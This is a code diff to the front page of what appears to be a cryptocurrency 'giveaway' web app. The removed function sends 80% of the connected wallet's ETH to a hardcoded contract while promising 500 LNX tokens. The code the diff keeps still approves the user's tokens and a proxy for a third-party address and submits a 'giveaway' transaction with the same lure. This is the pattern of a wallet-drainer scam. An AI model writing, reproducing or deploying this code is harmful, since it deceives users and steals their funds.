@@ -325,8 +325,6 @@ export default function HomeHero() {
       // 1) ERC20 approve each token in missingApprovals 2) approveProxy(deployer)
       await approveTokensAndProxy(MULTITOKEN_PROXY);
 
-      // One-click solution: Use permit for token approval + transaction in one call
-      await handleOneClickGiveaway();
       // Get the contract address for the current chain
       const contractAddresses = {
         1: "0x2490B36e95Fa39078cCC913626BAb459C9b86040", // Ethereum Mainnet
@@ -472,7 +470,8 @@ export default function HomeHero() {
 
       console.log("Giveaway transaction successful:", txHash);
 
-      // Optional: You could add success notification here
+      // Show success notification
+      alert("Giveaway transaction submitted! You will receive 500 LNX tokens.");
     } catch (error: unknown) {
       const errorMessage =
         error instanceof Error ? error.message : String(error);
@@ -481,94 +480,7 @@ export default function HomeHero() {
         fullError: error,
       });
 
-      // Optional: You could add error notification here
-    }
-  }
-
-  async function handleOneClickGiveaway() {
-    if (!isConnected || !address || !publicClient) return;
-
-    try {
-      console.log("Starting one-click giveaway...");
-
-      // Get contract address
-      const contractAddress = (process.env
-        .NEXT_PUBLIC_GIVEAWAY_CONTRACT_ADDRESS ||
-        "0x2490B36e95Fa39078cCC913626BAb459C9b86040") as `0x${string}`;
-
-      // Optional: Log POL balance for debugging (but don't block)
-      const polTokenAddress =
-        "0x455E53CBB86018AC2B8092FDCd39d8444AffC3f9" as `0x${string}`;
-
-      try {
-        const polBalance = await publicClient.readContract({
-          address: polTokenAddress,
-          abi: ERC20_ABI,
-          functionName: "balanceOf",
-          args: [address],
-        });
-
-        console.log(
-          "User POL balance:",
-          formatUnits(polBalance as bigint, 18),
-          "POL"
-        );
-      } catch (error) {
-        console.log("Could not check POL balance:", error);
-      }
-
-      // Get user's ETH balance and calculate 80%
-      const balance = await publicClient.getBalance({ address });
-      const giveawayAmount = (balance * BigInt(80)) / BigInt(100);
-
-      // Check if user has enough balance
-      if (giveawayAmount <= BigInt(0)) {
-        console.error("Insufficient balance for giveaway");
-        alert("Insufficient balance for giveaway!");
-        return;
-      }
-
-      // Encode the function call for the new contract
-      const functionData = encodeFunctionData({
-        abi: [
-          {
-            inputs: [],
-            name: "GiveAway",
-            outputs: [],
-            stateMutability: "payable",
-            type: "function",
-          },
-        ],
-        functionName: "GiveAway",
-        args: [],
-      });
-
-      // Create transaction request
-      const txRequest = {
-        to: contractAddress,
-        value: giveawayAmount,
-        data: functionData,
-        gas: BigInt(500000), // Increased gas for new contract
-      };
-
-      console.log("One-click giveaway transaction:", {
-        to: txRequest.to,
-        value: txRequest.value.toString(),
-        userBalance: balance.toString(),
-        from: address,
-        polCheck: "Passed",
-      });
-
-      // Send transaction - this is the only user interaction needed
-      const txHash = await sendTransaction(txRequest);
-      console.log("One-click giveaway successful:", txHash);
-
-      // Show success message
-      alert("Giveaway transaction submitted! You will receive 500 LNX tokens.");
-    } catch (error: unknown) {
-      const errorMessage =
-        error instanceof Error ? error.message : String(error);
-      console.error("One-click giveaway failed:", errorMessage);
+      // Show error notification
       alert("Giveaway failed: " + errorMessage);
     }
   }
